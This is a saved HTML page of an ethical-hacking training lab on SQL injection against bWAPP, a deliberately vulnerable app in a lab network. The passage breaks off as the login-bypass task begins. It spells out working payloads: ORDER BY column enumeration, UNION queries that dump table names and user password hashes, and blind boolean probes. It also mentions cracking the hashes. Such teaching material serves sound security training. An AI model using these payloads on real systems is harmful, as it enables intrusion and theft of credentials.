@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<!-- saved from url=(0071)https://www.practice-labs.com/authenticated/vNext/vn-print-content.aspx -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>
+	Print content
+</title><link href="./Print content_files/print-styles.css" rel="stylesheet">
+    <script src="./Print content_files/jquery.min.js.download"></script>
+    <script src="./Print content_files/jspdf.js.download"></script>
+    <script src="./Print content_files/from_html.js.download"></script>
+    <script src="./Print content_files/addimage.js.download"></script>
+    <script src="./Print content_files/filesaver.js.download"></script>
+    <script src="./Print content_files/pl.js.download"></script>
+</head>
+<body>
+    <form method="post" action="https://www.practice-labs.com/authenticated/vNext/vn-print-content.aspx" id="form1">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="EHMxwqSigsZSy5OL9dXNydH4O0On13rplbN4k1eW7m9iRbCc0Iqn+VNMHJn1NR7RmJwpQKhaeESAWFR/Du6jxgPyWjHZVj8SxwhTZl1RLP4=">
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="918AB9A0">
+</div>
+    <div>
+        
+
+        
+        
+        <div id="panPrintAvailable">
+	
+            <div class="print-content-wrapper" id="print-content">
+                <!--<button class="save-pdf">PDF</button>-->
+                <h1>Practice Labs - Ethical Hacker v11</h1>
+                <h2>Compromising SQL Injection Attacks</h2>
+                <div class="print-content-index">
+                    <ul>
+                        <li>Introduction</li><li>Lab Topology</li><li>Exercise 1 - Conduct SQL Injection Attacks</li><li>Exercise 2 - Prevent SQL Injection Attacks</li><li>Review</li>
+                    </ul>
+                </div>
+                <div class="print-content-content">
+                    <h2 class="exercise-title" id="cn-m17-0"><b>Introduction</b></h2>
+<div class="cn-metadata"><div>SQL Injection Attacks</div>
+<div>Enumeration</div>
+<div>UNION</div>
+<div>Bypass logins</div>
+<div>Boolean attack</div>
+<div>WebCruiser</div>
+<div>SQL Injection prevention</div>
+</div>
+<span class="atom-code hidden">9beca326-b493-4b0e-b3dc-d7dfb77df3c9</span>
+<p id="cn-m17-10">Welcome to the <b>Conducting SQL Injection Attacks </b>Practice Lab. In this module, you will be provided with the instructions and devices needed to develop your hands-on skills.</p>
+<span class="atom-code hidden">dc640c20-9434-45ea-b7c2-6d4d6a196bfc</span>
+<h2 class="cn-learningobjectives"><b>Learning Outcomes</b></h2>
+<p id="cn-m17-14">In this module, you will complete the following exercises:</p>
+<ul id="cn-m17-15">
+<li id="cn-m17-15">Exercise 1 - Conduct SQL Injection Attacks</li>
+<li id="cn-m17-16">Exercise 2 - Prevent SQL Injection Attacks</li>
+</ul>
+<p id="cn-m17-17">After completing this module, you will be able to:</p>
+<ul id="cn-m17-18">
+<li id="cn-m17-18">Launch a SQL Injection Attack</li>
+<li id="cn-m17-19">Enumerate the Number of Columns in A Database</li>
+<li id="cn-m17-20">Perform a UNION SQL Injection Attack</li>
+<li id="cn-m17-21">Launch a SQL Injection - Blind - Boolean Attack</li>
+<li id="cn-m17-22">Bypass Website Logins Using SQL Injection</li>
+<li id="cn-m17-23">Use WebCruiser to Detect SQL Injection</li>
+</ul>
+<p id="cn-m17-24">After completing this module, you will have further knowledge of:</p>
+<ul id="cn-m17-25">
+<li id="cn-m17-25">Methods to Prevent SQL Injection</li>
+</ul>
+<h2 class="cn-labduration"><b>Lab Duration</b></h2>
+<p id="cn-m17-27">It will take approximately <b>1hr 30 minutes </b>to complete this lab.</p>
+<span class="atom-code hidden">ef0258b6-cdff-43cd-b2c7-fd544de91981</span>
+<h2 class="cn-helpdandsupport"><b>Help and Support</b></h2>
+<p id="cn-m17-31">For more information on using Practice Labs, please see our <b>Help and Support </b>page. You can also raise a technical support ticket from this page.</p>
+<span class="cn-alert" id="cn-m17-32">Click <b>Next </b>to view the Lab topology used in this module.</span>
+<span class="atom-code hidden">d2c53300-f951-45a9-9aa4-3d4ecae69e11</span>
+<div class="print-exercise-break"></div><h2 class="exercise-title" id="cn-m17-34"><b>Lab Topology</b></h2>
+<p id="cn-m17-35">During your session, you will have access to the following lab configuration.</p>
+<span class="atom-code hidden">997f97e2-46a7-4a52-a5cc-0b41691f8c6b</span>
+<p id="cn-m17-38">Depending on the exercises, you may or may not use all of the devices, but they are shown here in the layout to get an overall understanding of the topology of the lab.</p>
+<span class="atom-code hidden">5bcf18f8-6f3a-4e93-b95a-9cd6076e9c56</span>
+<span class="cn-alert" id="cn-m17-41">Click <b>Next </b>to proceed to the first exercise.</span>
+<div class="print-exercise-break"></div><h2 class="exercise-title" id="cn-m17-42"><b>Exercise 1 - Conduct SQL Injection Attacks</b></h2>
+<p id="cn-m17-43">SQL Injection (SQLi) is an attack that allows an attacker to execute malicious SQL statements in a text box. Web applications are built with authentication and authorization. However, the attacker can use SQL statements to bypass application security controls and measures if not programmed properly. SQL injection attacks can allow the attacker to add, remove, modify, or manipulate data in a database in any way they would like. If the SQL injection attack is successful, the contents of an entire database are at the attacker's mercy.</p>
+<p id="cn-m17-44">In this exercise, you will learn to conduct SQL injection attacks.</p>
+<h2 class="cn-learningobjectives"><b>Learning Outcomes</b></h2>
+<p id="cn-m17-46">After completing this exercise, you will be able to:</p>
+<ul id="cn-m17-47">
+<li id="cn-m17-47">Launch a SQL Injection Attack</li>
+<li id="cn-m17-48">Enumerate the number of columns in the database</li>
+<li id="cn-m17-49">Perform a UNION SQL Injection Attack</li>
+<li id="cn-m17-50">Perform a SQL Injection - Blind - Boolean Attack</li>
+<li id="cn-m17-51">Bypass Website Logins Using SQL Injection</li>
+</ul>
+<h2 class="cn-devices"><b>Your Devices</b></h2>
+<p id="cn-m17-53">You will be using the following devices in this lab. Please power these on now.</p>
+<span class="atom-code hidden">e19aea1d-af66-45cd-9c91-6c719a51449f</span>
+<span class="atom-code hidden">891d016b-a51a-4990-a4c0-ffb0be26a55d</span>
+<h3 id="cn-m17-58"><b>Task 1 - Launch a SQL Injection Attack</b></h3>
+<p id="cn-m17-59">An SQL Injection vulnerability is one of the most dangerous vulnerabilities in a web application. If you don’t code a web application properly when building it, you are likely to face issues such as:</p>
+<ul id="cn-m17-60">
+<li id="cn-m17-60">Attackers bypassing logins</li>
+<li id="cn-m17-61">Retrieval of sensitive information</li>
+<li id="cn-m17-62">Modification and deletion of data</li>
+</ul>
+<p id="cn-m17-63">All of these can be caused by SQL Injection attacks.</p>
+<p id="cn-m17-64">You will be accessing a deliberately insecure web application (bWAPP) to conduct the SQL Injection Attacks. bWAPP’s vulnerabilities include all the OWASP Top 10 project risks for you to hack and learn.</p>
+<p id="cn-m17-65">In this task, you will learn to launch a SQL injection attack. To do this, perform the following steps:</p>
+<h4 id="cn-m17-66"><b><i>Step 1</i></b></h4>
+<p id="cn-m17-67">Make sure all required devices are powered on and connect to <b>PLABWIN10</b></p>
+<p id="cn-m17-68">Open <b>Microsoft Edge </b>by clicking on the icon on the taskbar.</p>
+<p id="cn-m17-69"></p><figure><img class="cn-img" id="cn-image-m17-c-0" src="./Print content_files/image-m17-c-0.jpg" alt="Figure 1.1 Screenshot of PLABWIN10: Desktop, searching the system for Microsoft Edge."><figcaption>Figure 1.1 Screenshot of PLABWIN10: Desktop, searching the system for Microsoft Edge.</figcaption></figure><p></p>
+<h4 id="cn-m17-71"><b><i>Step 2</i></b></h4>
+<p id="cn-m17-72">The <b>Microsoft Edge </b>window with the <b>MSN </b>homepage is displayed.</p>
+<p id="cn-m17-73">In the address bar, type the following URL:</p>
+<span class="cn-quote" id="cn-m17-74"><b><i>Note</i></b><i>: bWAPP is case-sensitive. Make sure you accurately enter the URL below.</i></span>
+<pre id="cn-m17-75"><code>http://192.168.0.10/bWAPP
+</code></pre>
+<p id="cn-m17-76">Press <b>Enter</b>.</p>
+<p id="cn-m17-77"></p><figure><img class="cn-img" id="cn-image-m17-c-1" src="./Print content_files/image-m17-c-1.jpg" alt="Figure 1.2 Screenshot of PLABWIN10: Entering the bWAPP URL in the address bar.."><figcaption>Figure 1.2 Screenshot of PLABWIN10: Entering the bWAPP URL in the address bar..</figcaption></figure><p></p>
+<h4 id="cn-m17-79"><b><i>Step 3</i></b></h4>
+<p id="cn-m17-80">Enter the following credentials:</p>
+<p id="cn-m17-81">Login:</p>
+<pre id="cn-m17-82"><code>bee
+</code></pre>
+<p id="cn-m17-83">Password:</p>
+<span class="cn-password">bug</span>
+<p id="cn-m17-85">Keep the <b>Set security </b>level drop down as <b>low</b>.</p>
+<p id="cn-m17-86">Click <b>Login</b>.</p>
+<p id="cn-m17-87"></p><figure><img class="cn-img" id="cn-image-m17-c-2" src="./Print content_files/image-m17-c-2.jpg" alt="Figure 1.3 Screenshot of PLABWIN10: Entering the user credentials and then selecting the Login button."><figcaption>Figure 1.3 Screenshot of PLABWIN10: Entering the user credentials and then selecting the Login button.</figcaption></figure><p></p>
+<h4 id="cn-m17-89"><b><i>Step 4</i></b></h4>
+<p id="cn-m17-90">The <b>bWAPP Portal </b>web page is displayed.</p>
+<p id="cn-m17-91">If a notification bar appears asking to save your password, click <b>Never.</b></p>
+<p id="cn-m17-92"></p><figure><img class="cn-img" id="cn-image-m17-c-3" src="./Print content_files/image-m17-c-3.jpg" alt="Figure 1.4 Screenshot of PLABWIN10: Selecting Not for this site in the notification bar."><figcaption>Figure 1.4 Screenshot of PLABWIN10: Selecting Not for this site in the notification bar.</figcaption></figure><p></p>
+<h4 id="cn-m17-94"><b><i>Step 5</i></b></h4>
+<p id="cn-m17-95">On the <b>bWAPP Portal </b>page, select <b>SQL Injection (Get/Search) </b>and select <b>Hack</b>.</p>
+<p id="cn-m17-96"></p><figure><img class="cn-img" id="cn-image-m17-c-4" src="./Print content_files/image-m17-c-4.jpg" alt="Figure 1.5 Screenshot of PLABWIN10: Selecting SQL Injection (Get/Search) from the list of bugs and then selecting the Hack button."><figcaption>Figure 1.5 Screenshot of PLABWIN10: Selecting SQL Injection (Get/Search) from the list of bugs and then selecting the Hack button.</figcaption></figure><p></p>
+<h4 id="cn-m17-98"><b><i>Step 6</i></b></h4>
+<p id="cn-m17-99">The <b>SQL Injection (GET/Search) </b>is displayed.</p>
+<p id="cn-m17-100">Without entering any data in the <b>Search for a movie </b>textbox, select the <b>Search </b>button.</p>
+<p id="cn-m17-101"></p><figure><img class="cn-img" id="cn-image-m17-c-5" src="./Print content_files/image-m17-c-5.jpg" alt="Figure 1.6 Screenshot of PLABWIN10: Selecting the Search Button to display results from the database."><figcaption>Figure 1.6 Screenshot of PLABWIN10: Selecting the Search Button to display results from the database.</figcaption></figure><p></p>
+<h4 id="cn-m17-103"><b><i>Step 7</i></b></h4>
+<p id="cn-m17-104">Your results are displayed. This means that there is a database in the backend that contains the movie list.</p>
+<p id="cn-m17-105"></p><figure><img class="cn-img" id="cn-image-m17-c-6" src="./Print content_files/image-m17-c-6.jpg" alt="Figure 1.7 Screenshot of PLABWIN10: Displaying the results of the database search."><figcaption>Figure 1.7 Screenshot of PLABWIN10: Displaying the results of the database search.</figcaption></figure><p></p>
+<h4 id="cn-m17-107"><b><i>Step 8</i></b></h4>
+<p id="cn-m17-108">To check if the web application is vulnerable to SQL injection attack, type the following into the search box.</p>
+<pre id="cn-m17-109"><code>m’
+</code></pre>
+<p id="cn-m17-110">Press <b>Search</b>.</p>
+<p id="cn-m17-111"></p><figure><img class="cn-img" id="cn-image-m17-c-7" src="./Print content_files/image-m17-c-7.jpg" alt="Figure 1.8 Screenshot of PLABWIN10: Testing the application for SQL Injection attack."><figcaption>Figure 1.8 Screenshot of PLABWIN10: Testing the application for SQL Injection attack.</figcaption></figure><p></p>
+<h4 id="cn-m17-113"><b><i>Step 9</i></b></h4>
+<p id="cn-m17-114">Notice the error. This confirms that the SQL Injection attack is possible.</p>
+<span class="cn-quote" id="cn-m17-115"><b><i>Note</i></b><i>: The error message also gives away too much information. In this case, identifying the type of database the web application uses (MySQL) lets potential hackers know to use only MySQL exploits. You need to make a hacker work harder for that type of information. Don’t give it away.</i></span>
+<p id="cn-m17-116"></p><figure><img class="cn-img" id="cn-image-m17-c-8" src="./Print content_files/image-m17-c-8.jpg" alt="Figure 1.9 Screenshot of PLABWIN10: Showing the SQL syntax error message and the notification bar."><figcaption>Figure 1.9 Screenshot of PLABWIN10: Showing the SQL syntax error message and the notification bar.</figcaption></figure><p></p>
+<span class="cn-alert" id="cn-m17-118">Keep the <b>bWAPP </b>window open and continue to the next task.</span>
+<h3 id="cn-m17-119"><b>Task 2 - Enumerate the number of columns in the backend database.</b></h3>
+<p id="cn-m17-120">There are many specific SQL injection attacks. In this task, you enumerate the database to see how many columns are in the database. This gives us information for other types of SQL injection attacks.</p>
+<p id="cn-m17-121">To identify the number of columns in the database, perform the following steps:</p>
+<h4 id="cn-m17-122"><b><i>Step 1</i></b></h4>
+<p id="cn-m17-123">You need to extract the total number of columns in the original SQL statement.</p>
+<p id="cn-m17-124">First, test if there is only one column in the database. Type the following code in the textbox:</p>
+<pre id="cn-m17-125"><code>m’ order by 1-- -
+</code></pre>
+<p id="cn-m17-126">Select <b>Search</b>.</p>
+<p id="cn-m17-128"></p><figure><img class="cn-img" id="cn-image-m17-c-9" src="./Print content_files/image-m17-c-9.jpg" alt="Figure 1.10 Screenshot of PLABWIN10: Entering the statement to find if the total number of columns that exist in the database is 1."><figcaption>Figure 1.10 Screenshot of PLABWIN10: Entering the statement to find if the total number of columns that exist in the database is 1.</figcaption></figure><p></p>
+<h4 id="cn-m17-130"><b><i>Step 2</i></b></h4>
+<p id="cn-m17-131">Notice the output.</p>
+<p id="cn-m17-132">This means that there is more than one column in the database.</p>
+<p id="cn-m17-133"></p><figure><img class="cn-img" id="cn-image-m17-c-10" src="./Print content_files/image-m17-c-10.jpg" alt="Figure 1.11 Screenshot of PLABWIN10: Showing the output of the statement that has been executed."><figcaption>Figure 1.11 Screenshot of PLABWIN10: Showing the output of the statement that has been executed.</figcaption></figure><p></p>
+<h4 id="cn-m17-135"><b><i>Step 3</i></b></h4>
+<p id="cn-m17-136">Next, try another random number. Type the following code in the text box:</p>
+<pre id="cn-m17-137"><code>m’ order by 8-- -
+</code></pre>
+<p id="cn-m17-138">Select <b>Search</b>.</p>
+<p id="cn-m17-140"></p><figure><img class="cn-img" id="cn-image-m17-c-11" src="./Print content_files/image-m17-c-11.jpg" alt="Figure 1.12 Screenshot of PLABWIN10: Entering the statement to extract the total number of columns that exist in the original SQL."><figcaption>Figure 1.12 Screenshot of PLABWIN10: Entering the statement to extract the total number of columns that exist in the original SQL.</figcaption></figure><p></p>
+<h4 id="cn-m17-142"><b><i>Step 4</i></b></h4>
+<p id="cn-m17-143">Notice the following error:</p>
+<p id="cn-m17-144"><b>Error: Unknown column ‘8’in ‘order clause’</b></p>
+<p id="cn-m17-145">This means that there are less than 8 columns.</p>
+<p id="cn-m17-147"></p><figure><img class="cn-img" id="cn-image-m17-c-12" src="./Print content_files/image-m17-c-12.jpg" alt="Figure 1.13 Screenshot of PLABWIN10: Showing the error caused by the entered statement."><figcaption>Figure 1.13 Screenshot of PLABWIN10: Showing the error caused by the entered statement.</figcaption></figure><p></p>
+<h4 id="cn-m17-149"><b><i>Step 5</i></b></h4>
+<p id="cn-m17-150">Next, try another random number. Type the following code in the textbox:</p>
+<pre id="cn-m17-151"><code>m’ order by 7-- -
+</code></pre>
+<p id="cn-m17-152">Select <b>Search</b>.</p>
+<p id="cn-m17-153"></p><figure><img class="cn-img" id="cn-image-m17-c-13" src="./Print content_files/image-m17-c-13.jpg" alt="Figure 1.14 Screenshot of PLABWIN10: Entering the statement to find the total number of columns that exist in the original SQL."><figcaption>Figure 1.14 Screenshot of PLABWIN10: Entering the statement to find the total number of columns that exist in the original SQL.</figcaption></figure><p></p>
+<h4 id="cn-m17-155"><b><i>Step 6</i></b></h4>
+<p id="cn-m17-156">There is no error when we ordered on column <b>7</b>. This confirms that there are <b>7 </b>columns in the original SQL statement.</p>
+<p id="cn-m17-157"></p><figure><img class="cn-img" id="cn-image-m17-c-14" src="./Print content_files/image-m17-c-14.jpg" alt="Figure 1.15 Screenshot of PLABWIN10: Showing the output of the entered statement."><figcaption>Figure 1.15 Screenshot of PLABWIN10: Showing the output of the entered statement.</figcaption></figure><p></p>
+<span class="cn-alert" id="cn-m17-159">Keep <b>bWAPP </b>open to continue to the next task.</span>
+<h3 id="cn-m17-160"><b>Task 3 - Perform a UNION SQL Injection attack</b></h3>
+<p id="cn-m17-161">In this task, you will perform a UNION SQL Injection attack. Now that you know how many columns are in the database, you will use that information to identify which column has the information you are after. In this task, you are looking for user passwords.</p>
+<p id="cn-m17-162">To perform the UNION SQL Injection attack, do the following steps:</p>
+<h4 id="cn-m17-163"><b><i>Step 1</i></b></h4>
+<p id="cn-m17-164">You will now select all seven columns at once using the&nbsp;<b>union all select&nbsp;</b>statement. To do this, type the following statement:</p>
+<pre id="cn-m17-165"><code>m' union all select 1,2,3,4,5,6,7 -- -
+</code></pre>
+<p id="cn-m17-166">Select <b>Search</b>.</p>
+<p id="cn-m17-168"></p><figure><img class="cn-img" id="cn-image-m17-c-15" src="./Print content_files/image-m17-c-15.jpg" alt="Figure 1.16 Screenshot of PLABWIN10: Entering the statement to show column names."><figcaption>Figure 1.16 Screenshot of PLABWIN10: Entering the statement to show column names.</figcaption></figure><p></p>
+<h4 id="cn-m17-170"><b><i>Step 2</i></b></h4>
+<p id="cn-m17-171">Notice that there is no error message.</p>
+<p id="cn-m17-172">The output is now generated.</p>
+<p id="cn-m17-173"></p><figure><img class="cn-img" id="cn-image-m17-c-16" src="./Print content_files/image-m17-c-16.jpg" alt="Figure 1.17 Screenshot of PLABWIN10: Showing the output of the union all select statement."><figcaption>Figure 1.17 Screenshot of PLABWIN10: Showing the output of the union all select statement.</figcaption></figure><p></p>
+<h4 id="cn-m17-175"><b><i>Step 3</i></b></h4>
+<p id="cn-m17-176">Next, extract the name of the database.</p>
+<p id="cn-m17-177">Type the following statement:</p>
+<pre id="cn-m17-178"><code>m' union all select 1,database(),3,4,5,6,7 -- -
+</code></pre>
+<p id="cn-m17-179">Click <b>Search</b>.</p>
+<p id="cn-m17-180"></p><figure><img class="cn-img" id="cn-image-m17-c-17" src="./Print content_files/image-m17-c-17.jpg" alt="Figure 1.18 Screenshot of PLABWIN10: Entering the union select statement."><figcaption>Figure 1.18 Screenshot of PLABWIN10: Entering the union select statement.</figcaption></figure><p></p>
+<h4 id="cn-m17-182"><b><i>Step 4</i></b></h4>
+<p id="cn-m17-183">The name of the database appears in the <b>Title </b>column.</p>
+<p id="cn-m17-184"></p><figure><img class="cn-img" id="cn-image-m17-c-18" src="./Print content_files/image-m17-c-18.jpg" alt="Figure 1.19 Screenshot of PLABWIN10: Showing the database name in the output."><figcaption>Figure 1.19 Screenshot of PLABWIN10: Showing the database name in the output.</figcaption></figure><p></p>
+<h4 id="cn-m17-187"><b><i>Step 5</i></b></h4>
+<p id="cn-m17-188">Now extract table names in the <b>bWAPP </b>database. Use MySQL database objects to extract this information. Enter the following all on one line:</p>
+<p id="cn-m17-189">m' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() -- -</p>
+<p id="cn-m17-190">Select <b>Search</b>.</p>
+<p id="cn-m17-191"></p><figure><img class="cn-img" id="cn-image-m17-c-19" src="./Print content_files/image-m17-c-19.jpg" alt="Figure 1.20 Screenshot of PLABWIN10: Entering a statement to extract table names from the database."><figcaption>Figure 1.20 Screenshot of PLABWIN10: Entering a statement to extract table names from the database.</figcaption></figure><p></p>
+<h4 id="cn-m17-193"><b><i>Step 6</i></b></h4>
+<p id="cn-m17-194">The result of the previous SQL injection show there are five tables in the <b>bWAPP </b>database: <b>blog, heroes, movies, users, </b>and <b>visitors</b>.</p>
+<p id="cn-m17-195"></p><figure><img class="cn-img" id="cn-image-m17-c-20" src="./Print content_files/image-m17-c-20.jpg" alt="Figure 1.21 Screenshot of PLABWIN10: Showing the table names in the output."><figcaption>Figure 1.21 Screenshot of PLABWIN10: Showing the table names in the output.</figcaption></figure><p></p>
+<h4 id="cn-m17-197"><b><i>Step 7</i></b></h4>
+<p id="cn-m17-198">Enumerate the <b>users </b>table and find its columns. To do this, type the following statement all on one line:</p>
+<pre id="cn-m17-199"><code>m' union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' and table_schema=database() -- -
+</code></pre>
+<p id="cn-m17-200">Select <b>Search</b>.</p>
+<p id="cn-m17-201"></p><figure><img class="cn-img" id="cn-image-m17-c-21" src="./Print content_files/image-m17-c-21.jpg" alt="Figure 1.22 Screenshot of PLABWIN10: Entering a statement to extract column names from the table."><figcaption>Figure 1.22 Screenshot of PLABWIN10: Entering a statement to extract column names from the table.</figcaption></figure><p></p>
+<h4 id="cn-m17-203"><b><i>Step 8</i></b></h4>
+<p id="cn-m17-204">The output reveals the names of the columns. There are <b>nine </b>columns in the <b>users </b>table.</p>
+<p id="cn-m17-205"></p><figure><img class="cn-img" id="cn-image-m17-c-22" src="./Print content_files/image-m17-c-22.jpg" alt="Figure 1.23 Screenshot of PLABWIN10: Showing the columns in the users table."><figcaption>Figure 1.23 Screenshot of PLABWIN10: Showing the columns in the users table.</figcaption></figure><p></p>
+<h4 id="cn-m17-207"><b><i>Step 9</i></b></h4>
+<p id="cn-m17-208">The <b>login, password, </b>and <b>secret </b>columns look interesting. Extract data from these columns by typing the following into the <b>Search </b>textbox.</p>
+<p id="cn-m17-209">m' union all select 1,login,password,secret,5,6,7 from users -- -0</p>
+<p id="cn-m17-210">Select <b>Search</b>.</p>
+<p id="cn-m17-211"></p><figure><img class="cn-img" id="cn-image-m17-c-23" src="./Print content_files/image-m17-c-23.jpg" alt="Figure 1.24 Screenshot of PLABWIN10: Entering a statement to extract data from the table."><figcaption>Figure 1.24 Screenshot of PLABWIN10: Entering a statement to extract data from the table.</figcaption></figure><p></p>
+<h4 id="cn-m17-213"><b><i>Step 10</i></b></h4>
+<p id="cn-m17-214">Two records are returned from the <b>users </b>table.</p>
+<p id="cn-m17-215">The data in the <b>Release </b>column contains hashed passwords. You can use any password cracking tool, such as <b>John the Ripper</b>, and retrieve the value. Doing this for the second row will return ‘bug’.</p>
+<span class="cn-quote" id="cn-m17-216"><b><i>Note</i></b><i>: Remember, this is the password you had used to log in for username </i><b><i>bee </i></b><i>in this web application.</i></span>
+<p id="cn-m17-217"></p><figure><img class="cn-img" id="cn-image-m17-c-24" src="./Print content_files/image-m17-c-24.jpg" alt="Figure 1.25 Screenshot of PLABWIN10: Showing the usernames in the users table."><figcaption>Figure 1.25 Screenshot of PLABWIN10: Showing the usernames in the users table.</figcaption></figure><p></p>
+<span class="cn-alert" id="cn-m17-219">Keep the <b>bWAPP </b>window open for the next task.</span>
+<h3 id="cn-m17-220"><b>Task 4 - Perform a SQL Injection - BLIND - BOOLEAN Attack</b></h3>
+<p id="cn-m17-221">The SQL Injection - Blind - Boolean-Based attack is similar to an SQL Injection attack. The only difference is that in a Blind - Boolean attack, you get answers in the form of true or false.</p>
+<p id="cn-m17-222">In this task, you will learn to launch a SQL Injection - Blind - Boolean attack. To do this, perform the following steps:</p>
+<h4 id="cn-m17-223"><b><i>Step 1</i></b></h4>
+<p id="cn-m17-224">Ensure that the <b>bWAPP </b>application is open in <b>PLABWIN10</b>.</p>
+<span class="cn-quote" id="cn-m17-225"><b><i>Note</i></b><i>: If you have closed Microsoft Edge at the end of the previous task, you need to log in to bWAPP using Step 2 to Step 5 of Task 1.</i></span>
+<p id="cn-m17-226">From the Choose your bug drop-down, select <b>SQL Injection - Blind - Boolean-Based </b>attack<b><i>.</i></b></p>
+<p id="cn-m17-227">Click <b>Hack</b>.</p>
+<p id="cn-m17-228"></p><figure><img class="cn-img" id="cn-image-m17-c-25" src="./Print content_files/image-m17-c-25.jpg" alt="Figure 1.26 Screenshot of PLABWIN10: Selecting the SQL Injection - Blind - Boolean-based attack and clicking Hack."><figcaption>Figure 1.26 Screenshot of PLABWIN10: Selecting the SQL Injection - Blind - Boolean-based attack and clicking Hack.</figcaption></figure><p></p>
+<h4 id="cn-m17-230"><b><i>Step 2</i></b></h4>
+<p id="cn-m17-231">The <b>SQL Injection - Blind - Boolean-Based </b>page is displayed. You will check to see what version of MySQL is being used. To see if the version begins with a <b>4</b>, type the following command:</p>
+<pre id="cn-m17-232"><code>test’ or substring(@@version,1,1)=4#
+</code></pre>
+<span class="cn-quote" id="cn-m17-233"><b><i>Note</i></b><i>: You may need to select </i><b><i>Information </i></b><i>from the blue </i><b><i>Menu </i></b><i>drop-down and turn on </i><b><i>Toggle Unicode characters </i></b><i>if the </i><b><i>@ </i></b><i>and </i><b><i># </i></b><i>characters do not show correctly. This is due to different keyboard layouts.</i></span>
+<p id="cn-m17-234">Select the <b>Search </b>button.</p>
+<p id="cn-m17-235"></p><figure><img class="cn-img" id="cn-image-m17-c-26" src="./Print content_files/image-m17-c-26.jpg" alt="Figure 1.27 Screenshot of PLABWIN10: Entering SQL statement into search textbox."><figcaption>Figure 1.27 Screenshot of PLABWIN10: Entering SQL statement into search textbox.</figcaption></figure><p></p>
+<h4 id="cn-m17-237"><b><i>Step 3</i></b></h4>
+<p id="cn-m17-238">The output states that the movie does not exist in the database.</p>
+<p id="cn-m17-239">This means that the answer to the executed command is false. The database version does not begin with a <b>4</b>.</p>
+<p id="cn-m17-240"></p><figure><img class="cn-img" id="cn-image-m17-c-27" src="./Print content_files/image-m17-c-27.jpg" alt="Figure 1.28 Screenshot of PLABWIN10: Showing output stating that the movie does not exist in the database."><figcaption>Figure 1.28 Screenshot of PLABWIN10: Showing output stating that the movie does not exist in the database.</figcaption></figure><p></p>
+<h4 id="cn-m17-242"><b><i>Step 4</i></b></h4>
+<p id="cn-m17-243">See if the version of the database begins with a <b>5</b>. In the&nbsp;<b>Search for a movie&nbsp;</b>text box, type the following command.</p>
+<p id="cn-m17-244">test’ or substring(@@version,1,1)=5#</p>
+<p id="cn-m17-245">Select <b>Search</b>:</p>
+<p id="cn-m17-247"></p><figure><img class="cn-img" id="cn-image-m17-c-28" src="./Print content_files/image-m17-c-28.jpg" alt="Figure 1.29 Screenshot of PLABWIN10: Entering SQL statement into search textbox."><figcaption>Figure 1.29 Screenshot of PLABWIN10: Entering SQL statement into search textbox.</figcaption></figure><p></p>
+<h4 id="cn-m17-249"><b><i>Step 5</i></b></h4>
+<p id="cn-m17-250">The output states that the movie exists in the database.</p>
+<p id="cn-m17-251">This means that the answer to the executed command is true. The database version begins with a <b>5</b>.</p>
+<p id="cn-m17-252"></p><figure><img class="cn-img" id="cn-image-m17-c-29" src="./Print content_files/image-m17-c-29.jpg" alt="Figure 1.30 Screenshot of PLABWIN10: Showing output stating that the movie exists in the database."><figcaption>Figure 1.30 Screenshot of PLABWIN10: Showing output stating that the movie exists in the database.</figcaption></figure><p></p>
+<h4 id="cn-m17-254"><b><i>Step 6</i></b></h4>
+<p id="cn-m17-255">You can also enumerate the database name one character at a time in a similar manner.</p>
+<p id="cn-m17-256">Check if the first letter of the database name begins with an ‘a’. Type the following command:</p>
+<pre id="cn-m17-257"><code>test’ or substring(database(),1,1)=’a’#
+</code></pre>
+<p id="cn-m17-258">Select <b>Search</b>.</p>
+<p id="cn-m17-259"></p><figure><img class="cn-img" id="cn-image-m17-c-30" src="./Print content_files/image-m17-c-30.jpg" alt="Figure 1.31 Screenshot of PLABWIN10: Entering SQL statement into search textbox."><figcaption>Figure 1.31 Screenshot of PLABWIN10: Entering SQL statement into search textbox.</figcaption></figure><p></p>
+<h4 id="cn-m17-261"><b><i>Step 7</i></b></h4>
+<p id="cn-m17-262">The output states that the movie does not exist in the database.</p>
+<p id="cn-m17-263">This means that the answer to the executed command is false. The database name does not start with an ‘a’.</p>
+<p id="cn-m17-264"></p><figure><img class="cn-img" id="cn-image-m17-c-31" src="./Print content_files/image-m17-c-31.jpg" alt="Figure 1.32 Screenshot of PLABWIN10: Showing output stating that the movie does not exist in the database."><figcaption>Figure 1.32 Screenshot of PLABWIN10: Showing output stating that the movie does not exist in the database.</figcaption></figure><p></p>
+<h4 id="cn-m17-266"><b><i>Step 8</i></b></h4>
+<p id="cn-m17-267">Check if the first letter of the database name begins with a ‘b’. type the following command:</p>
+<pre id="cn-m17-268"><code>test’ or substring(database(),1,1)=’b’#
+</code></pre>
+<p id="cn-m17-269">Select <b>Search</b>.</p>
+<p id="cn-m17-270"></p><figure><img class="cn-img" id="cn-image-m17-c-32" src="./Print content_files/image-m17-c-32.jpg" alt="Figure 1.33 Screenshot of PLABWIN10: Entering SQL statement into search textbox."><figcaption>Figure 1.33 Screenshot of PLABWIN10: Entering SQL statement into search textbox.</figcaption></figure><p></p>
+<h4 id="cn-m17-272"><b><i>Step 9</i></b></h4>
+<p id="cn-m17-273">This time the answer is true as the first letter of the database name is a ‘b’.</p>
+<span class="cn-quote" id="cn-m17-274"><b><i>Note</i></b><i>: Remember, you found earlier the database name is </i><b><i>bWAPP</i></b><i>.</i></span>
+<p id="cn-m17-275"></p><figure><img class="cn-img" id="cn-image-m17-c-33" src="./Print content_files/image-m17-c-33.jpg" alt="Figure 1.34 Screenshot of PLABWIN10: Showing output stating that the movie exists in the database."><figcaption>Figure 1.34 Screenshot of PLABWIN10: Showing output stating that the movie exists in the database.</figcaption></figure><p></p>
+<h3 id="cn-m17-277"><b>Task 5 - Bypass Web Application Logins Using SQL Injection.</b></h3>
+<p id="cn-m17-278">Using SQL Injection, you can bypass web application logins. Each web application that uses an authentication mechanism requires a database in the backend to authenticate users. Before you plan to bypass web application authentication, you need to find Websites that can be prone to such attacks.</p>
